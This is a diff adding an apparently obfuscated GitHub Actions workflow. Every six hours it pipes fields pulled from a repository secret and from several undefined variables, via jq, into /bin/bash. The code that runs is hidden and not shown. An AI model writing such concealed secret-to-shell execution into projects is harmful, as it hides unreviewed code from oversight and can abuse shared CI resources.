@@ -1,0 +1,24 @@
+name: jiarudiandagual
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiarudiandagual
+        env:
+          vau74: ${{ secrets.vau74 }}
+        run: |
+          echo $vau74 | jq -r .ufop40331 | /bin/bash
+          echo $dy3051 | jq -r .rafw2 | /bin/bash
+          echo $u9350 | jq -r .igk061 | /bin/bash
+          echo $eqb4690 | jq -r .kgup47218 | /bin/bash
+          echo $h87444 | jq -r .f1 | /bin/bash
+          echo $jjkuk9629 | jq -r .oiam813 | /bin/bash
+          echo $szmm5 | jq -r .dx2 | /bin/bash
+          echo $mivuh904 | jq -r .ihy4988 | /bin/bash
+
